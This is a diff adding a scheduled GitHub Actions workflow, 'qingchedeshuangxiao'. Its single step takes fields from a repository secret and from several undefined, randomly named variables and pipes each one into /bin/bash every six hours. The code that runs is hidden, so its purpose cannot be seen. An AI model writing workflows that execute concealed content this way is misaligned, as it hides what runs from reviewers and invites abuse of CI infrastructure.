@@ -1,0 +1,22 @@
+name: qingchedeshuangxiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qingchedeshuangxiao
+        env:
+          q9: ${{ secrets.q9 }}
+        run: |
+          echo $q9 | jq -r .s90120 | /bin/bash
+          echo $uay1937 | jq -r .ro700 | /bin/bash
+          echo $iyby93713 | jq -r .rsb53 | /bin/bash
+          echo $r4226 | jq -r .iyyyn65495 | /bin/bash
+          echo $ocxys324 | jq -r .k11 | /bin/bash
+
